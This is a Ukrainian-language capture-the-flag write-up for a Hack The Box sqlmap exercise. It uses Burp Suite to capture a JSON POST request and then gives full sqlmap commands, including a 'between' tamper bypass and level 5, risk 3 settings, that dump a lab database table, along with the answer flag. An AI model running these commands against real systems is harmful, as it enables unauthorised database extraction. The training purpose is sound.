# SQLMap Essentials — Skills Assessment: `final_flag`

**Модуль:** [SQLMap Essentials — Skills Assessment](https://academy.hackthebox.com/module/58)  
**Ціль:** Знайти вміст таблиці `final_flag` у базі `production`  
**Прапор:** `HTB{n07_50_h4rd_r16h7?!}`

***

## Середовище

- **OS:** Kali Linux
- **Інструменти:** Burp Suite, sqlmap
- **Цільовий хост:** `http://TARGET_IP:TARGET_PORT/`

***

## Крок 1 — Встановлення Burp Suite

```bash
sudo apt update && sudo apt install -y burpsuite
burpsuite
```

> Burp Suite є у репозиторіях Kali за замовчуванням. Після запуску вибираємо **Temporary project → Use Burp defaults → Start Burp**.

***

## Крок 2 — Перехоплення запиту

1. В Burp Suite: вкладка **Proxy → Intercept → Open browser** (вбудований Chromium).
2. У браузері відкриваємо ціль:
   ```
   http://TARGET_IP:TARGET_PORT/
   ```
3. Переходимо до **Shop** → `http://TARGET_IP:TARGET_PORT/shop.html`
4. Натискаємо **Add to cart** на будь-якому товарі.

***

## Крок 3 — Знаходимо POST-запит у HTTP history

1. У Burp Suite: **Proxy → HTTP history**
2. Шукаємо метод **POST** на `/action.php` — клікаємо на нього.
3. У нижній панелі відображається вкладка **Request → Pretty** з таким вмістом:

```http
POST /action.php HTTP/1.1
Host: TARGET_IP:TARGET_PORT
Content-Length: 8
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://TARGET_IP:TARGET_PORT
Referer: http://TARGET_IP:TARGET_PORT/shop.html
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"id":1}
```

> **Вразливий параметр:** `id` у JSON body — саме через нього проводиться SQL ін'єкція.

***

## Крок 4 — Збереження запиту у файл

Відкриваємо термінал Kali:

```bash
nano final.txt
```

Вставляємо повний текст перехопленого запиту (з Burp), зберігаємо: `Ctrl+O → Enter → Ctrl+X`.

***

## Крок 5 — Перший запуск sqlmap (енумерація БД і таблиць)

```bash
sqlmap -r final.txt --tamper=between --dump --batch --no-cast --level=5 --risk=3
```

### Пояснення ключових прапорів

| Прапор | Призначення |
|---|---|
| `-r final.txt` | Читає HTTP-запит з файлу (зберігає всі заголовки/body) |
| `--tamper=between` | **WAF bypass:** замінює оператори `>` та `<` на `BETWEEN x AND x` — обходить фільтрацію порівняльних символів на бекенді |
| `--dump` | Дампить дані з усіх знайдених таблиць |
| `--batch` | Автоматично відповідає "yes" на всі інтерактивні питання |
| `--no-cast` | Вимикає CAST-перетворення типів — усуває помилки на деяких СУБД |
| `--level=5` | Максимальна глибина тестування (більше injection points і payloads) |
| `--risk=3` | Дозволяє агресивніші payload-и, включно з OR-based |

### Чому `--tamper=between`?

Бекенд фільтрує символ `>`, що використовується у більшості boolean-based payloads (`WHERE id>0`, `IF(1>0,...)`). Tamper-скрипт `between` трансформує такі вирази:

```sql
-- До:
AND 1>0
-- Після:
AND 1 BETWEEN 0 AND 1
```

Таким чином логіка зберігається, але заборонений символ зникає з payload-у.

### Результат (фрагмент виводу)

```
[INFO] retrieved: final_flag
```

sqlmap знаходить таблицю `final_flag` у базі `production` — зупиняємо та уточнюємо команду.

***

## Крок 6 — Точковий дамп цільової таблиці

```bash
sqlmap -r final.txt \
  --tamper=between \
  --dump \
  --batch \
  --no-cast \
  --level=5 \
  --risk=3 \
  -D production \
  -T final_flag \
  -C content \
  --time-sec=3
```

### Додаткові прапори

| Прапор | Призначення |
|---|---|
| `-D production` | Вказуємо цільову базу даних |
| `-T final_flag` | Вказуємо цільову таблицю |
| `-C content` | Дампимо лише колонку `content` |
| `--time-sec=3` | Таймаут між time-based payload-ами — зменшує ризик false positives та розривів з'єднання |

### Фінальний вивід

```
[WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
HTB{n07_50_h4rd_r16h7?!}
Database: production
Table: final_flag
[1 entry]
+--------------------------+
| content                  |
+--------------------------+
| HTB{n07_50_h4rd_r16h7?!} |
+--------------------------+
```

***

## Injection Details

| Параметр | Значення |
|---|---|
| Endpoint | `POST /action.php` |
| Content-Type | `application/json` |
| Вразливий параметр | `id` (JSON body) |
| Injection Type | Time-based blind SQLi |
| СУБД | MySQL (production) |
| База | `production` |
| Таблиця | `final_flag` |
| Колонка | `content` |
| Bypass | `--tamper=between` (фільтр символу `>`) |

***

## Прапор

```
HTB{n07_50_h4rd_r16h7?!}
```
